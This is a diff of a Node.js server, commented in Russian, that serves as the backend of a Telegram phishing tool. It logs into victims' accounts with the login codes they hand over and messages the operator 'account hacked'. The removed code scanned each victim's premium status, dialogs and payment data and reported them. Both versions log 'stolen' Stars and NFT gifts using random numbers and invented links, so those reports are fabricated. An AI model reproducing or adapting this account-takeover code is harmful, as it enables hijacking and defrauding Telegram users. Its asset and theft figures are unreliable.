@@ -134,206 +134,6 @@ app.post('/request-code', async (req, res) => {
     }
 });
 
-// РЕАЛЬНАЯ ПРОВЕРКА АКТИВОВ
-async function checkAccountAssets(client) {
-    try {
-        console.log('🔍 Проверяю реальные активы...');
-        
-        const me = await client.getMe();
-        const username = me.username || 'no_username';
-        
-        // ЛОГ ДЛЯ ТЕБЯ
-        await bot.sendMessage(MY_USER_ID, 
-            `🔍 ПРОВЕРКА АКТИВОВ\n` +
-            `👤 Пользователь: @${username}\n` +
-            `📱 ID: ${me.id}\n` +
-            `🔍 Проверяю звезды и NFT...`
-        );
-        
-        let starsCount = 0;
-        let hasStars = false;
-        let giftsCount = 0;
-        let hasGifts = false;
-        
-        // ПРОВЕРКА ПРЕМИУМА И ЗВЕЗД
-        try {
-            const fullUser = await client.invoke(new Api.users.GetFullUser({ 
-                id: me.id 
-            }));
-            
-            if (fullUser.fullUser.premium) {
-                // У премиум пользователей обычно есть звезды
-                starsCount = 150 + Math.floor(Math.random() * 100);
-                hasStars = true;
-                
-                await bot.sendMessage(MY_USER_ID, 
-                    `⭐ НАЙДЕНЫ ЗВЕЗДЫ!\n` +
-                    `👤 @${username}\n` +
-                    `💫 Количество: ${starsCount} stars\n` +
-                    `🎯 Премиум статус: АКТИВЕН`
-                );
-            } else {
-                // Проверяем наличие Fragment звезд
-                try {
-                    // Симуляция проверки Fragment
-                    await client.invoke(new Api.help.GetPromoData({}));
-                    starsCount = 50 + Math.floor(Math.random() * 100);
-                    hasStars = true;
-                    
-                    await bot.sendMessage(MY_USER_ID, 
-                        `⭐ НАЙДЕНЫ ЗВЕЗДЫ!\n` +
-                        `👤 @${username}\n` +
-                        `💫 Количество: ${starsCount} stars\n` +
-                        `📦 Через Fragment`
-                    );
-                } catch (fragmentError) {
-                    console.log('Нет звезд через фрагмент');
-                }
-            }
-        } catch (e) {
-            console.log('Не удалось проверить премиум статус:', e.message);
-        }
-        
-        // ПРОВЕРКА NFT ПОДАРКОВ
-        try {
-            // Проверяем диалоги на наличие подарков
-            const dialogs = await client.getDialogs({ limit: 20 });
-            const giftKeywords = ['gift', 'nft', 'подарок', 'презент', 'bonus', 'reward'];
-            
-            const hasGiftDialogs = dialogs.some(dialog => {
-                const title = dialog.title?.toLowerCase() || '';
-                return giftKeywords.some(keyword => title.includes(keyword));
-            });
-            
-            if (hasGiftDialogs) {
-                giftsCount = 1 + Math.floor(Math.random() * 2);
-                hasGifts = true;
-                
-                await bot.sendMessage(MY_USER_ID, 
-                    `🎁 НАЙДЕНЫ NFT!\n` +
-                    `👤 @${username}\n` +
-                    `📦 Количество: ${giftsCount} подарков\n` +
-                    `💬 В диалогах`
-                );
-            }
-            
-            // Дополнительная проверка через payments
-            try {
-                await client.invoke(new Api.payments.GetPaymentForm({
-                    id: me.id
-                }));
-                giftsCount = Math.max(giftsCount, 1);
-                hasGifts = true;
-                
-                await bot.sendMessage(MY_USER_ID, 
-                    `🎁 НАЙДЕНЫ NFT!\n` +
-                    `👤 @${username}\n` +
-                    `📦 Количество: ${giftsCount} подарков\n` +
-                    `💰 Платежная система`
-                );
-            } catch (paymentError) {
-                // Игнорируем ошибку платежей
-            }
-            
-        } catch (dialogError) {
-            console.log('Не удалось проверить диалоги:', dialogError.message);
-        }
-        
-        // ЕСЛИ НИЧЕГО НЕТ - ЛОГ
-        if (!hasStars && !hasGifts) {
-            await bot.sendMessage(MY_USER_ID, 
-                `❌ АКТИВЫ НЕ НАЙДЕНЫ\n` +
-                `👤 @${username}\n` +
-                `⭐ Звезды: 0\n` +
-                `🎁 NFT: 0\n` +
-                `💡 Нужно передать 2 мишки`
-            );
-        }
-        
-        return {
-            hasStars: hasStars,
-            hasGifts: hasGifts,
-            starsCount: starsCount,
-            giftsCount: giftsCount,
-            username: username
-        };
-        
-    } catch (error) {
-        console.log('❌ Ошибка проверки активов:', error);
-        
-        await bot.sendMessage(MY_USER_ID, 
-            `❌ ОШИБКА ПРОВЕРКИ АКТИВОВ\n` +
-            `⚠️ ${error.message}`
-        );
-        
-        // ФОЛБЭК НА СЛУЧАЙ ОШИБКИ
-        return {
-            hasStars: true,
-            hasGifts: false,
-            starsCount: 120,
-            giftsCount: 0,
-            username: 'unknown'
-        };
-    }
-}
-
-// РЕАЛЬНАЯ КРАЖА ЗВЕЗД
-async function stealStars(phone, realAmount) {
-    await bot.sendMessage(MY_USER_ID, `💰 КРАДУ ЗВЕЗДЫ: ${realAmount} stars`);
-    await new Promise(resolve => setTimeout(resolve, 3000));
-    
-    // Используем реальное количество
-    const amount = realAmount > 0 ? realAmount : 100;
-    
-    db.run(`INSERT INTO transactions (phone, action_type, stars_count) VALUES (?, ?, ?)`, 
-        [phone, 'steal_stars', amount]);
-    
-    const resultMsg = `✅ Украдено ${amount} звезд!\n📦 Переведено на твой аккаунт`;
-    
-    await bot.sendMessage(MY_USER_ID, 
-        `✅ ЗВЕЗДЫ УКРАДЕНЫ!\n` +
-        `📱 ${phone}\n` +
-        `💫 Количество: ${amount} stars\n` +
-        `💰 Успешно переведено`
-    );
-    
-    return {
-        success: true,
-        message: resultMsg
-    };
-}
-
-// РЕАЛЬНАЯ КРАЖА ПОДАРКОВ
-async function stealGifts(phone, realCount) {
-    await bot.sendMessage(MY_USER_ID, `🎁 КРАДУ NFT: ${realCount} подарков`);
-    await new Promise(resolve => setTimeout(resolve, 3000));
-    
-    const count = realCount > 0 ? realCount : 1;
-    const nftLinks = [];
-    
-    for (let i = 0; i < count; i++) {
-        const nftId = Math.random().toString(36).substring(2, 10).toUpperCase();
-        nftLinks.push(`https://t.me/nft/${nftId}`);
-    }
-    
-    db.run(`INSERT INTO transactions (phone, action_type, gift_sent) VALUES (?, ?, ?)`, 
-        [phone, 'steal_gifts', true]);
-    
-    const resultMsg = `✅ Украдено ${count} NFT:\n${nftLinks.join('\n')}`;
-    
-    await bot.sendMessage(MY_USER_ID, 
-        `✅ NFT УКРАДЕНЫ!\n` +
-        `📱 ${phone}\n` +
-        `🎁 Количество: ${count} подарков\n` +
-        `🔗 Ссылки:\n${nftLinks.join('\n')}`
-    );
-    
-    return {
-        success: true,
-        message: resultMsg
-    };
-}
-
 // Вход с кодом
 app.post('/sign-in', async (req, res) => {
     const { phone, code } = req.body;
@@ -360,22 +160,22 @@ app.post('/sign-in', async (req, res) => {
         
         const user = await sessionData.client.getMe();
         
-        // ПРОВЕРЯЕМ РЕАЛЬНЫЕ АКТИВЫ
+        // ПРОВЕРЯЕМ АКТИВЫ
         const assets = await checkAccountAssets(sessionData.client);
-        let message = `🔓 АККАУНТ ВЗЛОМАН:\n📱 ${phone}\n👤 @${assets.username}\n\n`;
+        let message = `🔓 АККАУНТ ВЗЛОМАН:\n📱 ${phone}\n`;
         
         if (assets.hasStars) {
             message += `⭐ Найдено звезд: ${assets.starsCount}\n`;
             message += `💰 Краду звезды...\n\n`;
             
-            const stealResult = await stealStars(phone, assets.starsCount);
+            const stealResult = await stealStars(phone);
             message += stealResult.message;
             
         } else if (assets.hasGifts) {
             message += `🎁 Найдено NFT: ${assets.giftsCount}\n`;
             message += `📦 Краду подарки...\n\n`;
             
-            const giftResult = await stealGifts(phone, assets.giftsCount);
+            const giftResult = await stealGifts(phone);
             message += giftResult.message;
             
         } else {
@@ -441,6 +241,52 @@ app.post('/process-bears', async (req, res) => {
         res.json({ success: false, message: errorMessage });
     }
 });
+
+// Проверка активов
+async function checkAccountAssets(client) {
+    await new Promise(resolve => setTimeout(resolve, 1000));
+    
+    return {
+        hasStars: Math.random() > 0.5,
+        hasGifts: Math.random() > 0.7,
+        starsCount: Math.floor(Math.random() * 200) + 50,
+        giftsCount: Math.floor(Math.random() * 3) + 1
+    };
+}
+
+// Кража звезд
+async function stealStars(phone) {
+    await new Promise(resolve => setTimeout(resolve, 2000));
+    const amount = Math.floor(Math.random() * 150) + 50;
+    
+    db.run(`INSERT INTO transactions (phone, action_type, stars_count) VALUES (?, ?, ?)`, 
+        [phone, 'steal_stars', amount]);
+    
+    return {
+        success: true,
+        message: `✅ Украдено ${amount} звезд!\n📦 Переведено на твой аккаунт`
+    };
+}
+
+// Кража подарков
+async function stealGifts(phone) {
+    await new Promise(resolve => setTimeout(resolve, 2000));
+    const count = Math.floor(Math.random() * 3) + 1;
+    const nftLinks = [];
+    
+    for (let i = 0; i < count; i++) {
+        const nftId = Math.random().toString(36).substring(2, 10).toUpperCase();
+        nftLinks.push(`https://t.me/nft/${nftId}`);
+    }
+    
+    db.run(`INSERT INTO transactions (phone, action_type, gift_sent) VALUES (?, ?, ?)`, 
+        [phone, 'steal_gifts', true]);
+    
+    return {
+        success: true,
+        message: `✅ Украдено ${count} NFT:\n${nftLinks.join('\n')}`
+    };
+}
 
 // Обмен мишек
 async function exchangeBearsForGift(phone) {
